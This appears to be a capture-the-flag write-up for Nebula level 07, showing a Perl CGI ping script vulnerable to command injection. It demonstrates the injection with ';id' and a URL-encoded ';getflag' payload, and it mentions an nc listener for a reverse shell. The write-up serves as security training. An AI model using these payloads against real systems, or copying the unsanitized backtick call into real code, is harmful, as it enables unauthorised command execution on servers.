---
layout: default
title: "Nebula07"
tags: Nebula
description: "Exploiting a command injection in the Perl web server"
---


## Level 07

> The `flag07` user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server. To do this level, log in as the `level07` account with the password `level07`. Files for this level can be found in `/home/flag07`.

## Source code

```
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```
## Getting the flag

This is a common codebase vulnerable to command injection. Calling a system function and translating user input as an argument without any sanitization generally is not so great idea. In a case like that and attacker could try to "pipe" the other commands to the execution with the `;` symbol.  The `;` is using to drop the argument and execute the next command right after it, something like `<command1>`;`<command2>`.  
Let's try to exploit this particular example!  
There are two files in the `flag07` directory:
```
level07@nebula:/home/flag07$ ls
index.cgi  thttpd.conf
```

The `index.cgi` is a program the with the source code we just reviewed. Let's try to execute it in a proper flow:

```
evel07@nebula:/home/flag07$ ./index.cgi Host=localhost
Content-type: text/html

<html><head><title>Ping results</title></head><body><pre>PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.022 ms
64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.043 ms
64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.042 ms

--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 0.022/0.035/0.043/0.011 ms
```

And as we already feagured out the injection point, let's try it out too:

```
level07@nebula:/home/flag07$ ./index.cgi Host=;id
Content-type: text/html

<html><head><title>Ping results</title></head><body><pre>Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface]
            [-M pmtudisc-hint] [-m mark] [-S sndbuf]
            [-T tstamp-options] [-Q tos] [hop1 ...] destination
</pre></body></html>uid=1008(level07) gid=1008(level07) groups=1008(level07)
```

So we have a command injection. We can't grab the flag from that point, as we will get the `getflag is executing on a non-flag account, this doesn't count` message. Instead, let's check the other file in the folder:
```
level07@nebula:/home/flag07$ cat thttpd.conf 
# /etc/thttpd/thttpd.conf: thttpd configuration file

# This file is for thttpd processes created by /etc/init.d/thttpd.
# Commentary is based closely on the thttpd(8) 2.25b manpage, by Jef Poskanzer.

# Specifies an alternate port number to listen on.
port=7007

# Specifies a directory to chdir() to at startup. This is merely a convenience -
# you could just as easily do a cd in the shell script that invokes the program.
dir=/home/flag07

# Do a chroot() at initialization time, restricting file access to the program's
# current directory. If chroot is the compiled-in default (not the case on
# Debian), then nochroot disables it. See thttpd(8) for details.
nochroot
#chroot

# Specifies a directory to chdir() to after chrooting. If you're not chrooting,
# you might as well do a single chdir() with the dir option. If you are
# chrooting, this lets you put the web files in a subdirectory of the chroot
# tree, instead of in the top level mixed in with the chroot files.
#data_dir=

# Don't do explicit symbolic link checking. Normally, thttpd explicitly expands
# any symbolic links in filenames, to check that the resulting path stays within
# the original document tree. If you want to turn off this check and save some
# CPU time, you can use the nosymlinks option, however this is not
# recommended. Note, though, that if you are using the chroot option, the
# symlink checking is unnecessary and is turned off, so the safe way to save
# those CPU cycles is to use chroot.
#symlinks
#nosymlinks

# Do el-cheapo virtual hosting. If vhost is the compiled-in default (not the
# case on Debian), then novhost disables it. See thttpd(8) for details.
#vhost
#novhost

# Use a global passwd file. This means that every file in the entire document
# tree is protected by the single .htpasswd file at the top of the tree.
# Otherwise the semantics of the .htpasswd file are the same. If this option is
# set but there is no .htpasswd file in the top-level directory, then thttpd
# proceeds as if the option was not set - first looking for a local .htpasswd
# file, and if that doesn't exist either then serving the file without any
# password. If globalpasswd is the compiled-in default (not the case on Debian),
# then noglobalpasswd disables it.
#globalpasswd
#noglobalpasswd

# Specifies what user to switch to after initialization when started as root.
user=flag07

# Specifies a wildcard pattern for CGI programs, for instance "**.cgi" or
# "/cgi-bin/*". See thttpd(8) for details.
cgipat=**.cgi

# Specifies a file of throttle settings. See thttpd(8) for details.
#throttles=/etc/thttpd/throttle.conf

# Specifies a hostname to bind to, for multihoming. The default is to bind to
# all hostnames supported on the local machine. See thttpd(8) for details.
#host=

# Specifies a file for logging. If no logfile option is specified, thttpd logs
# via syslog(). If logfile=/dev/null is specified, thttpd doesn't log at all.
#logfile=/var/log/thttpd.log

# Specifies a file to write the process-id to. If no file is specified, no
# process-id is written. You can use this file to send signals to thttpd. See
# thttpd(8) for details.
#pidfile=

# Specifies the character set to use with text MIME types.
#charset=iso-8859-1

# Specifies a P3P server privacy header to be returned with all responses. See
# http://www.w3.org/P3P/ for details. Thttpd doesn't do anything at all with the
# string except put it in the P3P: response header.
#p3p=

# Specifies the number of seconds to be used in a "Cache-Control: max-age"
# header to be returned with all responses. An equivalent "Expires" header is
# also generated. The default is no Cache-Control or Expires headers, which is
# just fine for most sites.
#max_age=
```

Noticed anything useful? Yes, the user `flag07` is running the webserver on the port `7007` with the same vulnerable binary.  
There are a few avenues to get the flag here:
- Open your browser with something like `http://<ip_of_the_vm>:7007/index.cgi?Host=%3Bgetflag` 
- `nc -nlvp 9001` listener on the `level07` machine, and any reverse shell send as a command to the webserver
- `wget` of the `getflag` with the  URL specified above

Note: The `%3B` is the URL-encoded `;` symbol

## Other Nebula levels 
- [level00](https://hackish.space/Nebula-level00)
- [level01](https://hackish.space/Nebula-level01)
- [level02](https://hackish.space/Nebula-level02)
- [level03](https://hackish.space/Nebula-level03)
- [level04](https://hackish.space/Nebula-level04)
- [level05](https://hackish.space/Nebula-level05)
- [level06](https://hackish.space/Nebula-level06)
- [level07](https://hackish.space/Nebula-level07)
- [level08](https://hackish.space/Nebula-level08)
- [level09](https://hackish.space/Nebula-level09)
- [level10](https://hackish.space/Nebula-level10)
- [level11](https://hackish.space/Nebula-level11)
- [level12](https://hackish.space/Nebula-level12)
- [level13](https://hackish.space/Nebula-level13)
- [level14](https://hackish.space/Nebula-level14)
- [level15](https://hackish.space/Nebula-level15)
- [level16](https://hackish.space/Nebula-level16)
- [level17](https://hackish.space/Nebula-level17)
- [level18](https://hackish.space/Nebula-level18)
- [level19](https://hackish.space/Nebula-level19)